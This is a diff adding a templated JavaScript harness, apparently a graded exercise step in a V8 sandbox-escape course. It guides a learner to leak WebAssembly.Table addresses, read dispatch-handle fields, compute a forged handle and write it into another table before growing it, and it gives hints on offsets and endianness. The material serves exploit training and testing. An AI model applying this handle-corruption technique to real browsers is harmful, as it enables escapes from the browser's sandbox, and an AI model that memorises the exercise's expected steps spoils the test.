@@ -1,0 +1,155 @@
+{% extends "../../../common/sandbox-guard-harness.js.j2" %}
+
+{% block setup %}
+const dispatchHandleFieldOffset = 0x1c;
+const targetOffset = 6;
+const growCount = 0x10;
+
+const paddingTables = Array.from({ length: 0x40 }, () => new WebAssembly.Table({ element: "anyfunc", initial: 1, maximum: 1 }));
+const calibrationTable1 = new WebAssembly.Table({ element: "anyfunc", initial: 1, maximum: 1 });
+const calibrationTable2 = new WebAssembly.Table({ element: "anyfunc", initial: 1, maximum: 1 });
+const growTable = new WebAssembly.Table({ element: "anyfunc", initial: 0, maximum: growCount });
+
+const calibrationTable1Offset = guardTools.realSandbox.getAddressOf(calibrationTable1);
+const calibrationTable2Offset = guardTools.realSandbox.getAddressOf(calibrationTable2);
+const growTableOffset = guardTools.realSandbox.getAddressOf(growTable);
+const calibrationHandle1Offset = calibrationTable1Offset + dispatchHandleFieldOffset;
+const calibrationHandle2Offset = calibrationTable2Offset + dispatchHandleFieldOffset;
+const growHandleOffset = growTableOffset + dispatchHandleFieldOffset;
+const calibrationHandle1 = guardTools.readUint32(calibrationHandle1Offset);
+const calibrationHandle2 = guardTools.readUint32(calibrationHandle2Offset);
+const originalGrowHandle = guardTools.readUint32(growHandleOffset);
+const handleStride = (calibrationHandle2 - calibrationHandle1) | 0;
+const expectedTargetHandle = (calibrationHandle1 - handleStride * targetOffset) >>> 0;
+
+if (calibrationHandle1 === 0 || calibrationHandle2 === 0 || originalGrowHandle === 0) {
+    guardTools.fail("Harness error: table dispatch handles should be nonzero.");
+}
+if (handleStride === 0) {
+    guardTools.fail("Harness error: calibration table handles should have a nonzero stride.");
+}
+if (expectedTargetHandle === originalGrowHandle) {
+    guardTools.fail("Harness error: staged target handle should differ from the original grow-table handle.");
+}
+
+let leakedCalibrationTable1 = false;
+let leakedCalibrationTable2 = false;
+let leakedGrowTable = false;
+let readCalibrationTable1 = false;
+let readCalibrationTable2 = false;
+let wroteGrowTable = false;
+let usedGrowHelper = false;
+
+function byteSwap32(value) {
+    return (((value & 0xff) << 24) | ((value & 0xff00) << 8) | ((value >>> 8) & 0xff00) | ((value >>> 24) & 0xff)) >>> 0;
+}
+
+function tableName(obj) {
+    if (obj === calibrationTable1) return "calibrationTable1";
+    if (obj === calibrationTable2) return "calibrationTable2";
+    if (obj === growTable) return "growTable";
+    return undefined;
+}
+
+function diagnoseMemoryViewOffset(viewOffset) {
+    if (viewOffset === calibrationTable1Offset || viewOffset === calibrationTable2Offset || viewOffset === growTableOffset) {
+        guardTools.fail("This starts at a table object header. Add dispatchHandleFieldOffset to reach the dispatch-handle field.");
+    }
+    if (viewOffset === calibrationTable1Offset + 1 || viewOffset === calibrationTable2Offset + 1 || viewOffset === growTableOffset + 1) {
+        guardTools.fail("Sandbox.getAddressOf already returns the object start, not a tagged reference. Do not add the heap-object tag.");
+    }
+    if (viewOffset === growHandleOffset + 4) {
+        guardTools.fail("This points just past growTable's dispatch-handle field. Use the field start.");
+    }
+}
+
+function guardedDispatchView(offset, size) {
+    const viewOffset = guardTools.normalizeNumber(offset, "MemoryView offset");
+    const viewSize = guardTools.normalizeNumber(size, "MemoryView size");
+    diagnoseMemoryViewOffset(viewOffset);
+    guardTools.requireSameNumber(viewSize, 4, "A trusted dispatch-table handle is a 32-bit field.");
+
+    if (viewOffset === calibrationHandle1Offset) {
+        if (!leakedCalibrationTable1) {
+            guardTools.fail("First leak calibrationTable1 with Sandbox.getAddressOf(calibrationTable1).");
+        }
+        readCalibrationTable1 = true;
+        return new guardTools.realSandbox.MemoryView(viewOffset, viewSize);
+    }
+    if (viewOffset === calibrationHandle2Offset) {
+        if (!leakedCalibrationTable2) {
+            guardTools.fail("First leak calibrationTable2 with Sandbox.getAddressOf(calibrationTable2).");
+        }
+        readCalibrationTable2 = true;
+        return new guardTools.realSandbox.MemoryView(viewOffset, viewSize);
+    }
+    if (viewOffset === growHandleOffset) {
+        if (!leakedGrowTable) {
+            guardTools.fail("First leak growTable with Sandbox.getAddressOf(growTable).");
+        }
+        wroteGrowTable = true;
+        return new guardTools.realSandbox.MemoryView(viewOffset, viewSize);
+    }
+
+    guardTools.fail("This ramp only allows MemoryView access to the calibration and grow-table dispatch-handle fields.");
+}
+
+function growStagedTable() {
+    if (!readCalibrationTable1 || !readCalibrationTable2) {
+        guardTools.fail("Read both calibration table handles before computing the target handle.");
+    }
+    if (!wroteGrowTable) {
+        guardTools.fail("Write the computed target handle to growTable before calling growStagedTable().");
+    }
+
+    const stagedHandle = guardTools.readUint32(growHandleOffset);
+    if (stagedHandle === byteSwap32(expectedTargetHandle)) {
+        guardTools.fail("The staged target handle is byte-swapped. DataView.setUint32 defaults to big-endian; pass true for little-endian.");
+    }
+    if (stagedHandle !== expectedTargetHandle) {
+        guardTools.fail("Compute the target handle from the calibration handle stride and targetOffset, then write it to growTable.");
+    }
+
+    usedGrowHelper = true;
+    return growTable.grow(growCount);
+}
+
+function requireStagedGrow() {
+    if (!usedGrowHelper) {
+        guardTools.fail("Call growStagedTable() after staging the target handle.");
+    }
+    if (growTable.length !== growCount) {
+        guardTools.fail("growStagedTable() should grow growTable to the requested length.");
+    }
+    return true;
+}
+
+const sandboxRules = Object.freeze({
+    getAddressOf(obj) {
+        const name = tableName(obj);
+        if (name === undefined) {
+            guardTools.fail("This ramp only allows leaking calibrationTable1, calibrationTable2, and growTable.");
+        }
+        if (obj === calibrationTable1) leakedCalibrationTable1 = true;
+        if (obj === calibrationTable2) leakedCalibrationTable2 = true;
+        if (obj === growTable) leakedGrowTable = true;
+        return guardTools.realSandbox.getAddressOf(obj);
+    },
+    MemoryView(offset, size) {
+        return guardedDispatchView(offset, size);
+    },
+});
+{% endblock %}
+
+{% block expose %}
+guardTools.exposeConstant("calibrationTable1", calibrationTable1);
+guardTools.exposeConstant("calibrationTable2", calibrationTable2);
+guardTools.exposeConstant("growTable", growTable);
+guardTools.exposeConstant("dispatchHandleFieldOffset", dispatchHandleFieldOffset);
+guardTools.exposeConstant("targetOffset", targetOffset);
+guardTools.exposeConstant("growStagedTable", growStagedTable);
+{% endblock %}
+
+{% block validate %}
+return requireStagedGrow();
+{% endblock %}
